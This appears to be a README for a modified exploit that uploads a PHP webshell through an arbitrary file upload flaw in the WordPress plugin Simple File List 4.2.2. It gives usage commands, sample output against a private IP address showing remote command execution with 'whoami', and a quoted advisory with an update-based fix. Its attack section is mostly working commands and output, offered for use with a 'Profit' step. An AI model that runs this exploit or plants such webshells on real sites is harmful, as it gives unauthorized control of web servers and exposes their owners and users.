# Wordpress-Plugin-Simple-File-List-4.2.2---Remote-Code-Execution
Modified version of original exploit by coiffeur to add a php webshell for vulnerable Wordpress plugin: Simple File List 4.2.2

## Usage
1. Uploading the webshell

```bash
python exploit.py <url>
```
2. Execute RCE via uploaded webshell via GET request on target

```bash
curl <given url path to webshell>?cmd=<command to run on target>
```

3. Profit

## Example

```bash
└─$ python my_exploit.py http://192.168.229.105                                        
[ ] File 2383.png
[ ] File uploaded at http://192.168.229.105/wp-content/uploads/simple-file-list/2383.png
[ ] File moved to http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php
[+] Exploit seem to work.
[+] GET request for RCE via php webshell: http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php?cmd=<command to run on target>
                                                                                                                                                                                                                                             
....                                                                                                                                                                                                                                             
└─$ curl http://192.168.229.105/wp-content/uploads/simple-file-list/2383.php?cmd=whoami
http
                                                       
```

## Exploit Details:

From https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-simple-file-list-arbitrary-file-upload-4-2-2/

*WordPress Plugin Simple File List is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to properly verify user-supplied input. An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible. WordPress Plugin Simple File List version 4.2.2 is vulnerable; prior versions may also be affected.*

## Remediation

Update to plugin version 4.2.6 or latest.
